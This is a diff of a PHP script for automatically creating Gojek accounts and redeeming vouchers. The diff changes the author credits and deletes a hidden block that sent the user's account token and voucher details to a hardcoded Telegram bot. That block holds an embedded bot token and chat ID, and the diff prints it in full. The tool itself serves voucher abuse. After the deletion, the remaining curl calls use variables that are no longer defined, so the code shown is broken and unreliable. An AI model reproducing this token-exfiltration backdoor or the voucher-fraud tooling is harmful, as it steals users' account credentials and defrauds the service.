@@ -5,8 +5,8 @@ echo color("green"," =================================== \n");
 echo color("green"," Claim Voucher \n");
 echo color("green"," Auto Create & Redeem Voucher \n");
 echo color("green"," =================================== \n");
-echo " Created by : kurang beruntung chanel \n";
-echo " Version    : sucribe chanel kurang beruntung chanel\n";
+echo " Created by : BANG OBLO \n";
+echo " Version    : ANDROID\n";
 echo " Time       : ".date('d-m-Y||H:i:s')." \n";
 echo color("green"," =================================== \n");
 
@@ -134,15 +134,7 @@ echo color("green"," =================================== \n");
 					$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
 					$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
 					$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-					$TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
-					$chatid = "785784404";
-					$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
-					$method	= "sendMessage";
-					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
-					$post = ['chat_id' => $chatid, 'text' => $pesan];
-					$header = ["X-Requested-With: XMLHttpRequest",
-						"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];
-					$ch = curl_init();
+
 						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 						curl_setopt($ch, CURLOPT_URL, $url);
 						curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
